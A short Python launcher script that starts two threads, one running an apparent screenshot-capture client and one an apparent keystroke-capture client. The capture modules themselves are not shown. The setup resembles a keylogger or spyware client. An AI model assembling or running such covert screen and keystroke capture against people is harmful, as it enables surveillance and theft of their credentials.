import client_screenshots
import keyboard_getting_client
import threading

if __name__ == "__main__":
    t1 = threading.Thread(target=client_screenshots.main, args=())
    t2 = threading.Thread(target=keyboard_getting_client.main, args=())

    t1.start()
    t2.start()

    t1.join()
    t2.join()

    print("Done !")